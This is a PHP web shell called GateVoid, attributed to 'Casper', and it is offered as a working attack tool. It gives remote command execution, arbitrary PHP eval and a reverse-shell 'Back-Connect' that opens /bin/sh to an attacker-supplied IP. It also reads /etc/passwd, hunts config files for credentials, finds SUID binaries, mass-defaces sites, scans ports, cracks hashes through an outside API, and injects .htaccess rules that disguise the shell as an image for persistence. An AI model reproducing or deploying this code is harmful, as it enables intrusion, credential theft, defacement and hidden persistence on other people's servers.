...
$CONFIG = [
    'title'             => 'GateVoid',
    'author'            => 'Casper',
    'password'          => 'J4CKGanzz', /*null tanpa ' = off*/
...
<head>
    <title><?php echo $f[14]($CONFIG['title']);?></title>
    ...
    <style>
        ...
        *:after {
        ...
        @media screen and (max-width:768px) {
            ...
            .file-table td[colspan="6"] {
                padding-left: 10px;
                justify-content: flex-start;
            }

            .file-table td[colspan="6"]:before {
                display: none;
            }
        }
    </style>
...
<body>
    <div class="container">
        <h1><?php echo $f[14]($CONFIG['title']);?></h1>
        <div class="tabs">
            <a href="?p=dashboard" class="<?php if($page=='dashboard')echo'active';?>">Dashboard</a>
            <a href="?p=files&path=<?php echo urlencode($path);?>"
                class="<?php if($page=='files')echo'active';?>">Files</a>
        ...
        <?php if(isset($_GET['msg'])):?><div class="message <?php echo $f[14]($_GET['status']);?>">
            <?php echo$f[14]($_GET['msg']);?></div><?php endif;?>
        <?php switch($page):case'dashboard':?><div class="dashboard-grid">
            <div class="action-box">
                <h3>Info Server</h3>
                <table style="width:100%">
                    <tr>
                        <td><b>Uname</b></td>
                        <td><?php echo $f[14]($f[23]());?></td>
                    </tr>
                    <tr>
                        <td><b>User</b></td>
                        <td><?php echo $f[14]($f[40]());?></td>
                    </tr>
                    <tr>
                        <td><b>Server IP</b></td>
                        <td><?php echo $_SERVER['SERVER_ADDR']?$_SERVER['SERVER_ADDR']:gethostbyname($_SERVER['HTTP_HOST']);?>
                        </td>
                    </tr>
                    <tr>
                        <td><b>Your IP</b></td>
                    ...
                    <tr>
                        ...
                        <td style="word-break:break-all;">
                            <?php echo $f[14]($f[27]('disable_functions'))?:'<i>None</i>';?></td>
                    </tr>
                </table>
            </div>
            <div class="action-box">
                <h3>Info Disk</h3>
                <?php $ds_root=stristr(PHP_OS,'WIN')?'C:':'/';$total_space=@$f[38]($ds_root);$free_space=@$f[39]($ds_root);if($total_space&&$free_space){$used_space=$total_space-$free_space;$used_percent=round(($used_space/$total_space)*100);echo'<p>'.formatSize($used_space).' / '.formatSize($total_space).' ('.$used_percent.'%)</p><div class="progress-bar"><div style="width:'.$used_percent.'%;">'.$used_percent.'%</div></div>';}else{echo'<p>Tidak dapat mengambil info disk.</p>';}?>
            </div>
            <div class="action-box">
                <h3>Pengguna Server</h3>
                <pre><?php $passwd=@$f[2]('/etc/passwd');if($passwd){echo $f[14]($passwd);}else{echo'<i>Tidak dapat membaca /etc/passwd</i>';}?></pre>
            </div>
            <div class="action-box">
                <h3>Direktori Writable</h3>
                <pre><?php $writable_dirs=[];findInterestingDirs($path,$writable_dirs);if(!empty($writable_dirs)){foreach(array_unique($writable_dirs)as $dir){echo $f[14]($dir)."\n";}}else{echo'<i>Tidak ada direktori writable yang ditemukan.</i>';}?></pre>
            </div>
        </div><?php break; case'cmd':?><div class="action-box">
            <h3>Command Execution</h3>
            <form method="POST"><input type="text" name="cmd" placeholder="e.g. whoami" autofocus><input type="submit"
                    value="Execute"></form><?php if(isset($_POST['cmd'])):?><h3>Output:</h3>
            <pre><?php echo $f[14](executeCommand($_POST['cmd']));?></pre><?php endif;?>
        </div><?php break;
case'eval':?><div class="action-box">
            <h3>PHP Code Executor</h3>
            <form method="POST"><textarea name="php_code"
                    placeholder="e.g. echo phpversion();"><?php if(isset($_POST['php_code']))echo $f[14]($_POST['php_code']);?></textarea><input
                    type="submit" value="Execute PHP"></form><?php if(isset($_POST['php_code'])):?><h3>Output:</h3>
            <pre><?php ob_start();$f[30]($_POST['php_code']);echo $f[14](ob_get_clean());?></pre><?php endif;?>
        </div><?php break;
case'info':?><div class="action-box">
            <h3>PHP Information</h3><iframe id="phpinfo-iframe" src="?phpinfo=true"></iframe>
        </div><?php break;
case'db':?><div class="action-box">
            <h3>Database Manager (Adminer)</h3>
            <?php if(isset($_SESSION['adminer_error'])){echo'<div class="message error">'.$f[14]($_SESSION['adminer_error']).'</div>';unset($_SESSION['adminer_error']);}?>
            <form method="POST">
                ...
                </table><input type="submit" name="db_login" value="Login to Database">
            </form>
            <p>Tip: Find credentials using Mass Tools -> Config Finder.</p>
        </div><?php break;
case'mass':?>
        <div class="action-box">
            <h3>Config Finder</h3>
            <form method="POST">
                <p>Click the button to automatically find main config files by traversing up from the current directory.
                </p><input type="submit" name="find_configs" value="Find Root Configs">
            </form>
            <?php if(isset($_POST['find_configs'])){$results=[];smartConfigFinder($results);if(!empty($results)){echo'<h3>Configs Found:</h3><pre>';foreach($results as $r){echo'<b>'.$f[14]($r).'</b>'."\n".'<code style="color:var(--highlight)">'.$f[14]($f[2]($r)).'</code>'."\n\n";}echo'</pre>';}else{echo'<p>No main config files found.</p>';}}?>
        </div>
        <div class="action-box">
            <h3>String Finder</h3>
            <form method="POST">
                <p>Directory to search: <input type="text" name="search_dir" value="<?php echo $f[14]($path);?>"></p>
                <p>String/Pattern: <input type="text" name="search_query" required></p>
                <p><label><input type="checkbox" name="is_regex" style="width:auto;"> Use Regular Expression</label></p>
                <input type="submit" name="string_finder" value="Find String">
            </form>
            <?php if(isset($_POST['string_finder'])){$results=[];findStringsInFiles($_POST['search_dir'],$_POST['search_query'],isset($_POST['is_regex']),$results);if(!empty($results)){echo'<h3>Files containing "'.$f[14]($_POST['search_query']).'":</h3><pre>'.$f[14](implode("\n",$results)).'</pre>';}else{echo'<p>No files found containing that string.</p>';}}?>
        </div>
        <div class="action-box">
            <h3>SUID/SGID Finder</h3>
            <form method="POST">
                <p>Directory to scan: <input type="text" name="suid_dir" value="/usr/bin"></p><input type="submit"
                    name="suid_finder" value="Find SUID/SGID Files">
            </form>
            <?php if(isset($_POST['suid_finder'])){$results=[];findSuidSgidFiles($_POST['suid_dir'],$results);if(!empty($results)){echo'<h3>Potentially exploitable files found:</h3><pre>'.$f[14](implode("\n",$results)).'</pre>';}else{echo'<p>No SUID/SGID files found in that directory.</p>';}}?>
        </div>
        <div class="action-box">
            <h3>Mass Deface</h3>
            <form method="POST">
                ...
                <p>File Content:<br><textarea name="deface_content">Hacked</textarea></p><input type="submit"
                    name="start_deface" value="Start Mass Deface">
            </form>
            <?php if(isset($_POST['start_deface'])){$results=['success'=>[],'failed'=>[]];massDefaceRecursive($_POST['deface_dir'],$_POST['deface_filename'],$_POST['deface_content'],$results);echo'<h3>Results:</h3><p>Success ('.count($results['success']).'):</p><pre>'.(empty($results['success'])?'None':$f[14](implode("\n",$results['success']))).'</pre><p>Failed ('.count($results['failed']).'):</p><pre>'.(empty($results['failed'])?'None':$f[14](implode("\n",$results['failed']))).'</pre>';}?>
        </div>
        <?php break;
case'net':?><div class="action-box">
            <h3>Port Scanner</h3>
            <form method="POST">
                <p>Host: <input type="text" name="scan_host" value="127.0.0.1"> Ports (comma separated): <input
                        type="text" name="scan_ports" value="21,22,80,443,3306,5432"></p><input type="submit"
                    name="port_scan" value="Scan Ports">
            </form>
            <?php if(isset($_POST['port_scan'])){echo'<h3>Scan Results:</h3><pre>';$ports=explode(',',$_POST['scan_ports']);foreach($ports as $p){$p=trim($p);if(!$p)continue;$conn=@$f[33]($_POST['scan_host'],$p,$errno,$errstr,1);if($conn){echo"Port $p: [OPEN]\n";@fclose($conn);}else{echo"Port $p: [CLOSED]\n";}}echo'</pre>';}?>
        </div>
        <div class="action-box">
            <h3>Back-Connect</h3>
            <form method="POST">
                <p>IP Address: <input type="text" name="bc_ip" placeholder="Your IP"> Port: <input type="text"
                        name="bc_port" placeholder="Your Port"></p><input type="submit" name="back_connect"
                    value="Connect">
            </form>
            <?php if(isset($_POST['back_connect'])){$ip=$_POST['bc_ip'];$port=$_POST['bc_port'];if($f[0]($f[34])&&$f[0]($f[35])){$pid=@$f[34]();if($pid){@$f[35]();$sock=@$f[33]($ip,$port);if($sock){@dup2($sock,0);@dup2($sock,1);@dup2($sock,2);$shell=@$f[30]('return "'.(stristr(PHP_OS,'WIN')?'cmd.exe':'/bin/sh -i').'";');@$f[25]($shell);}else{echo'<pre>Connection Failed.</pre>';}}}else{echo'<pre>Error: pcntl_fork or posix_setsid not available.</pre>';}}?>
        </div><?php break;
case'crypto':?><div class="action-box">
            <h3>Hash Identifier & Cracker</h3>
            <form method="POST">
                <p>Hash:</p><textarea name="hash_input"
                    style="height:100px;"><?php echo isset($_POST['hash_input'])?$f[14]($_POST['hash_input']):'';?></textarea><input
                    type="submit" name="hash_tools" value="Identify & Crack">
            </form>
            <?php if(isset($_POST['hash_tools'])){$hash=trim($_POST['hash_input']);echo'<h3>Results for: '.$f[14]($hash).'</h3>';$type=identify_hash($hash);echo'<p><b>Detected Type:</b> '.$f[14]($type).'</p>';$cracked=crack_hash_api($hash);if($cracked){echo'<p><b>CrackStation API Result:</b> <span style="color:var(--success);font-weight:bold;">'.$f[14]($cracked).'</span></p>';}else{echo'<p><b>CrackStation API Result:</b> Not Found</p>';}}?>
        </div>
        <div class="action-box">
            <h3>HTAccess Persistence</h3>
            <form method="POST">
                <p>File to Hide (e.g., this shell): <input type="text" name="hide_file"
                        value="<?php echo$f[14]($f[13](__FILE__));?>"></p>
                <p>Fake Name (e.g., logo.png): <input type="text" name="fake_name" value="logo.png"></p><input
                    type="submit" name="htaccess_inject" value="Inject Rule to .htaccess">
            </form>
            <?php if(isset($_POST['htaccess_inject'])){$htaccess_path=$path.'/.htaccess';$rule="\nRewriteEngine On\nRewriteRule ^".$f[14]($_POST['fake_name'])."$ ".$f[14]($_POST['hide_file'])." [L]\n";if($f[3]($htaccess_path,$f[2]($htaccess_path).$rule)!==false){echo'<p style="color:var(--success)">Rule injected! Now try to access '.$f[14]($_POST['fake_name']).'</p>';}else{echo'<p style="color:var(--error)">Failed to write to .htaccess</p>';}}?>
        </div>
        <div class="action-box">
            <h3>Self Destruct</h3>
            <p>This will permanently delete this webshell file from the server.</p><a href="?self_destruct=true"
                onclick="return confirm('ARE YOU ABSOLUTELY SURE? This action is irreversible.')"
                style="color:var(--error);font-weight:bold;">[ Self Destruct Now ]</a>
        </div>
        <?php break;case'files':default:$action_target=isset($_GET['target'])?$f[11]($path.'/'.$_GET['target']):'';if($action=='edit'&&$f[4]($action_target)){echo'<div class="action-box"><h3>Edit: '.$f[14]($f[13]($action_target)).'</h3><form method="POST"><textarea name="content">'.$f[14]($f[2]($action_target)).'</textarea><input type="hidden" name="target_file" value="'.$f[14]($action_target).'"><input type="submit" name="edit_save" value="Save"></form></div>';}elseif($action=='chmod'){echo'<div class="action-box"><h3>Chmod: '.$f[14]($f[13]($action_target)).'</h3><form method="POST"><input type="text" name="perms" value="'.substr($f[17]('%o',@$f[16]($action_target)),-4).'"><input type="hidden" name="target_file" value="'.$f[14]($action_target).'"><input type="submit" name="chmod_save" value="Save"></form></div>';}elseif($action=='rename'){echo'<div class="action-box"><h3>Rename: '.$f[14]($f[13]($action_target)).'</h3><form method="POST"><input type="text" name="new_name" value="'.$f[14]($f[13]($action_target)).'"><input type="hidden" name="target_file" value="'.$f[14]($action_target).'"><input type="submit" name="rename_save" value="Rename"></form></div>';}elseif($action=='extract'){echo'<div class="action-box"><h3>Extract: '.$f[14]($f[13]($action_target)).'</h3><p>Extract to current directory?</p><form method="POST"><input type="hidden" name="target_file" value="'.$f[14]($action_target).'"><input type="submit" name="extract_save" value="Yes, Extract"></form></div>';}else{?>
        <div class="path-nav"><strong>Path:</strong>
            <?php $path_parts=explode('/',str_replace('\\','/',$path));$built_path='';foreach($path_parts as $i=>$part){if(empty($part)&&$i==0){echo'<a href="?p=files&path=/">/</a>';continue;}if(empty($part))continue;$built_path.='/'.$part;echo'<a href="?p=files&path='.urlencode($built_path).'">'.$f[14]($part).'</a>/';}?>
        </div>
        <div class="action-box">
            <h3>Upload</h3>
            <form method="POST" enctype="multipart/form-data"><input type="file" name="upload_file"><input type="submit"
                    value="Upload"></form>
        </div>
        <div class="action-box">
            <h3>Create</h3>
            <form method="POST"><select name="type" style="width:auto;">
                    <option value="file">File</option>
                    <option value="dir">Directory</option>
                </select><input type="text" name="name" placeholder="Name" required
                    style="width:auto;margin:0 10px;"><input type="submit" name="create" value="Create"></form>
        </div>
        <form method="POST">
            <table class="file-table">
                ...
                <tbody>
                    <?php if($path!='/')echo'<tr><td colspan="6"><a href="?p=files&path='.urlencode($f[12]($path)).'">.. (Parent)</a></td></tr>';$files=@$f[8]($path);$dirs_list=[];$files_list=[];if($files){foreach($files as $file){if($file=='.'||$file=='..')continue;if($f[5]($path.'/'.$file))$dirs_list[]=$file;else $files_list[]=$file;}}sort($dirs_list);sort($files_list);$sorted_list=array_merge($dirs_list,$files_list);foreach($sorted_list as $file){$file_path=$path.'/'.$file;$is_dir=$f[5]($file_path);$actions_link='?p=files&target='.urlencode($file).'&path='.urlencode($path);echo'<tr><td data-label="Select"><input type="checkbox" class="file-checkbox" name="selected_files[]" value="'.$f[14]($file_path).'"></td>';echo'<td data-label="Name">';if($is_dir)echo'<a href="?p=files&path='.urlencode($file_path).'"><b>'.$f[14]($file).'</b></a>';else echo $f[14]($file);echo'</td>';echo'<td data-label="Size">'.($is_dir?'DIR':formatSize(@$f[15]($file_path))).'</td>';echo'<td data-label="Permissions"><a href="'.$actions_link.'&action=chmod">'.getPerms($file_path).'</a></td>';echo'<td data-label="Modified">'.$f[18]("Y-m-d H:i:s",@$f[19]($file_path)).'</td>';echo'<td data-label="Actions" class="file-actions">';if(!$is_dir)echo'<a href="'.$actions_link.'&action=edit">Edit</a>';echo'<a href="'.$actions_link.'&action=rename">Rename</a>';if(!$is_dir&&$f[29]('ZipArchive')&&@$f[28]($file_path)['extension']=='zip')echo'<a href="'.$actions_link.'&action=extract">Extract</a>';echo'<a href="'.$actions_link.'&action=delete" onclick="return confirm(\'Delete?\')">Del</a>';echo'</td></tr>';}?>
                </tbody>
            </table><?php if($f[29]('ZipArchive')):?><div style="margin-top:10px;"><input type="submit"
                    name="zip_selected" value="Zip Selected"></div><?php endif;?>
        </form><?php }break;endswitch;?><div style="text-align:center;margin-top:20px;padding:10px;color:#777;">VoidGate
            by <?php echo$f[14]($CONFIG['author']);?> - 2025</div>
    </div>
</body>
